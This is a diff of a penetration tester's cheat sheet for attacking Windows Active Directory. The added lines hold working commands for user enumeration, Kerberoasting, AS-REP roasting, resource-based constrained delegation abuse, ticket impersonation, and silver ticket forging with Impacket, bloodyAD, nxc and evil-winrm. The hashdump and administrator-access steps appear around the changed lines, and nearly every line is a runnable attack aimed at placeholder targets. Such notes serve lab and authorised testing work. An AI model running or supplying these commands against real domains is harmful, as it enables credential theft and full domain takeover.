@@ -119,6 +119,9 @@ cat usernames | sort -u | tee usernames
 cat passwords | sort -u | tee passwords
 cat pwned | sort -u | sort -k5,5
 
+## Finding Usernames and Passwords
+strings -el file.exe | grep -iE 'pass|key|user|secret|conf'
+
 ## Web
 whatweb http://$TARGET
 nuclei -u http://$TARGET
@@ -136,9 +139,12 @@ while true; do ssltest.py $TARGET |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 
 echo '$TARGET' | tee hosts_
 nxc smb hosts_ -u 'anonymous' -p '' --shares
 nxc ftp hosts_ -u 'anonymous' -p '' --ls
+nmap -iL hosts_ --script "ldap* and not brute" -p 389 | awk '/Nmap scan report/{ip=$NF} /dnsHostName/{h[ip]=h[ip] ? h[ip]" "$3 : $3} END{for (i in h) print i, h[i]}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
+
+
 cat computers | cut -d '$' -f1 > passwords_computers
 nxc smb hosts_ -u computers -p passwords_computers --no-brute --local-auth
-nmap -iL hosts_ --script "ldap* and not brute" -p 389 | awk '/Nmap scan report/{ip=$NF} /dnsHostName/{h[ip]=h[ip] ? h[ip]" "$3 : $3} END{for (i in h) print i, h[i]}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
+
 for host in $(cat hosts_); do echo "================[  $host  ]================"; rpcclient -U "" -N $host -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'; echo; done
 kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
@@ -156,7 +162,7 @@ echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes
 cp hashes /mnt/c/hashcat
 cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
 
-# Foothold: Protocols and Services
+# Foothold: Protocols, Services and Tech
 ## Web
 [*] Web Shell
 [###] Content Types
@@ -752,17 +758,29 @@ finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
-[###] .ccache
+[###] Generate .ccache
+impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'
 impacket-getTGT $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; kcme
 
-[###] Kerberos .ccache Negotiation
+[###] Kerberoast
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile usernames_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile computers_$DC
+
+[###] ASREPRoast
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
+
+
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
+
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
 impacket-getTGT $DOM/'mypc$':'123qweasdF!'; kcme
 impacket-getST $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; kcme
-impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
+
 impacket-getTGT $DOM/'administrator' -hashes ':'; kcme
 evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 evil-winrm -i $TARGET -u administrator -H ''
@@ -772,17 +790,19 @@ impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '12
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
 
-[###] Silver Ticket
--->> Domain SID
+[###] Ticket: Impersonate
+impacket-getST -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD' -altservice cifs -spn 'time/m3webaw' -impersonate 'Admin.User.Logon'
+
+[###] Silver Ticket: Domain SID
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(ObjectClass=user)(objectSid=*)(!(ObjectClass=foreignSecurityPrincipal)))" --attr objectSid | grep -avE 'nTSecurityDescriptor:|distinguishedName:' | cut -d ' ' -f 2 | sed 's/-[0-9]\+$//' | sort -u | sed '/^$/d' | tee silver-ticket
 
--->> Service Principal Name
+[###] Silver Ticket: Service Principal Name
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1 >> silver-ticket; cat silver-ticket
 
--->> Service Account Password Hash
+[###] Silver Ticket: Service Account Password Hash
 echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/' >> silver-ticket; cat silver-ticket
 
--->> Create Ticket
+[###] Silver Ticket: Create Ticket
 cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; kcme
 
 [###] Golden Ticket
